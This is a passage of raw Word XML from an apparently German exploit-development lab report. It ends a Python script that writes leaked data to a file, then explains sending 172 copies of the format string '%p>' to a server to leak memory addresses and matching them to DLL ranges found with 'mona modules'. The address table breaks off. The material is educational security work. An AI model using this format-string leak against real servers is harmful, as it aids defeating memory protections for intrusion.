          <w:p w14:paraId="1860AD2D" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="00B47CB9" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>string = string.replace("\r\nIst die Aenderung akzeptabel [y/n]:", "")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4FE0607A" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>string = string.replace("&gt;", "\r\n")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DE20CF2" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="14179DF2" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    # write into the file</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69131478" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    f = open(fileName, "w")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C052B58" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    f.write(string)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D5C8A17" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    f.close()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="322A53E5" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1CE1533B" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="00B47CB9" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>def main():</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B42CC83" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="00B47CB9" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAddresses()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CAC7B68" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="00B47CB9" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="6ABBF11A" w14:textId="20071901" w:rsidR="00195E44" w:rsidRPr="00B47CB9" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>main()</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00195E44" w:rsidRPr="00B47CB9" w14:paraId="3FEE8D80" w14:textId="77777777" w:rsidTr="00195E44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6206F4EA" w14:textId="235FD93D" w:rsidR="00195E44" w:rsidRPr="00B47CB9" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Leaked_addresses_1.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4367F501" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="00B47CB9" w:rsidRDefault="00195E44" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="170EB1B1" w14:textId="5751B642" w:rsidR="00904CAC" w:rsidRPr="00B47CB9" w:rsidRDefault="00357448" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Diese generiert einen Buffer von </w:t>
      </w:r>
      <w:r w:rsidR="00477671" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>172-mal</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> de</w:t>
      </w:r>
      <w:r w:rsidR="00904CAC" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> folgenden</w:t>
      </w:r>
      <w:r w:rsidR="00904CAC" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Zeichenfolge: %p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D808685" w14:textId="4D82B8BF" w:rsidR="00904CAC" w:rsidRPr="00B47CB9" w:rsidRDefault="00904CAC" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Es wurde mithilfe von manuellen Testen herausgefunden, dass diese Zeichenfolge maximal </w:t>
      </w:r>
      <w:r w:rsidR="00477671" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>172-mal</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> an den Server geschickt werden kann, ohne </w:t>
      </w:r>
      <w:r w:rsidR="00477671" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>dass</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> dieser Abstürzt und somit noch eine Response liefert. Das Zeichen &gt; wurde eingefügt, um </w:t>
      </w:r>
      <w:r w:rsidR="00BF79F1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">im Response ermitteln zu können, </w:t>
      </w:r>
      <w:r w:rsidR="00E654ED" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>an welcher Stelle die Adresse endet.</w:t>
      </w:r>
      <w:r w:rsidR="00590B3D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Die </w:t>
      </w:r>
      <w:r w:rsidR="00B662A3" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Länge</w:t>
      </w:r>
      <w:r w:rsidR="00590B3D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> des Response Buffers wurde </w:t>
      </w:r>
      <w:r w:rsidR="00313D12" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">ebenfalls </w:t>
      </w:r>
      <w:r w:rsidR="00590B3D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>manuell</w:t>
      </w:r>
      <w:r w:rsidR="00313D12" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ermittelt, dieser ist aber Variable da hin und wieder </w:t>
      </w:r>
      <w:r w:rsidR="000A1F40" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>unterschiedliche Daten im Response zurückkommen.</w:t>
      </w:r>
      <w:r w:rsidR="00945B0F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Mit </w:t>
      </w:r>
      <w:r w:rsidR="00817346" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">der Errechnung der variablen Länge abhängig von der Anzahl der Zeichenfolgen „%p&gt;“ </w:t>
      </w:r>
      <w:r w:rsidR="001138A6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">konnte sichergestellt werden, dass immer die volle Anzahl an geleakten Adressen empfangen werden können. </w:t>
      </w:r>
      <w:r w:rsidR="00FE737D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Nicht gewünschte Zeichen werden </w:t>
      </w:r>
      <w:r w:rsidR="00071E4E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>aus der Response</w:t>
      </w:r>
      <w:r w:rsidR="00FE737D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> entfernt und statt dem &gt; w</w:t>
      </w:r>
      <w:r w:rsidR="00071E4E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ird ein Zeilenumbruch eingefügt.</w:t>
      </w:r>
      <w:r w:rsidR="00491063" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Mithilfe des Befehls „mona modules“ wurde anschließend die Base und Top Adressen der Module ausgelesen (siehe Abbildung)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE0C28E" w14:textId="6C94C6E2" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C1FD6FD" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="327DCDE0" wp14:editId="4208E2D4">
            <wp:extent cx="4865427" cy="1527218"/>
            <wp:effectExtent l="0" t="0" r="0" b="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867874" cy="1527986"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C876C19" w14:textId="23631450" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00491063" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Anschließend wurde manuell überprüft, welche </w:t>
      </w:r>
      <w:r w:rsidR="00984258" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>geleakten Adressen einer DLL zugeordnet werden können. Diese wurden Grün markiert.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15E91A7D" w14:textId="77777777" w:rsidR="00491063" w:rsidRPr="00B47CB9" w:rsidRDefault="00491063" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3858"/>
        <w:gridCol w:w="5202"/>
      </w:tblGrid>
      <w:tr w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w14:paraId="4A4A39C0" w14:textId="77777777" w:rsidTr="00411DEE">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3858" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="624AB9CC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Zeile</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5202" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="67C6A238" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Leaked Adress</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w14:paraId="50D4B266" w14:textId="77777777" w:rsidTr="00411DEE">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3858" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1C965AD0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F268BCB" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14CDC75C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3565DB61" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F9DF29B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0970DA09" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="496947D0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66F4C768" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5792E09C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38BF95DE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28E52D48" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B06EF81" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="541F2B96" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4AD7FFEB" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B81BFD3" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BA8D93F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37A30653" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04368016" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>18</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39DC8EFB" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D65F57E" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B87D976" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>21</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15AE52EB" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>22</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BAFCD0C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>23</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="025A30BC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="590C5AF0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A097D56" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="691A160B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28CCA0FA" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
